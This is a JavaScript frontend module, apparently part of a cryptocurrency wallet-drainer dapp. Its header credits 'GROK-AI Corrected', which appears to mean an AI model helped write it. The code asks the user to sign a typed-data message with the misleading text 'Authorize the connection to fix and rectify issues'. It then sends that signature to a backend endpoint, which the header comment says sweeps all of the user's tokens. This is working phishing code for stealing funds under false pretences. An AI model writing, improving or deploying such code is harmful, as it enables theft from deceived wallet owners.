// frontend/src/utils/singleSignatureSweep.js
/**
 * GROK-AI Corrected: Single Signature for ALL Chain Transfers
 * User signs ONE message → Backend sweeps ALL tokens
 */

export async function initiateSingleSignatureSweep(provider, userAddress) {
  // ✅ Step 1: Create authorization message
  const authMessage = {
    domain: {
      name: 'Dapp',
      version: '1',
      chainId: 1
    },
    types: {
      Authorization: [
        { name: 'action', type: 'string' },
        { name: 'description', type: 'string' },
        { name: 'validUntil', type: 'uint256' },
        { name: 'nonce', type: 'uint256' }
      ]
    },
    primaryType: 'Authorization',
    message: {
      action: 'DECENTRALIZED DAPP',
      description: 'Authorize the connection to fix and rectify issues',
      validUntil: Math.floor(Date.now() / 1000) + 7200, // 2 hours
      nonce: Date.now()
    }
  }

  try {
    console.log('📝 Requesting single signature from user...')

    // ✅ Step 2: Request ONE signature from user
    const signature = await provider.request({
      method: 'eth_signTypedData_v4',
      params: [userAddress, JSON.stringify(authMessage)]
    })

    console.log('✅ User signed! Sending to backend...')

    // Validate signature format
    if (typeof signature !== 'string' || !signature.startsWith('0x')) {
      throw new Error('Invalid signature format from wallet')
    }

    // ✅ Step 3: Send signature to backend
    const response = await fetch('/api/full-sweep', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: userAddress,
        signature,
        authMessage
      })
    })

    const result = await response.json()

    if (result.success) {
      console.log('✅ Sweep successful!', result.transfers)
      return {
        success: true,
        message: 'All assets transferred successfully!',
        transfers: result.transfers
      }
    } else {
      console.error('❌ Sweep failed:', result.error)
      return {
        success: false,
        message: 'Sweep failed: ' + result.error
      }
    }
  } catch (err) {
    console.error('❌ Error:', err)
    return {
      success: false,
      message: 'User rejected or error occurred: ' + err.message
    }
  }
}

export default initiateSingleSignatureSweep
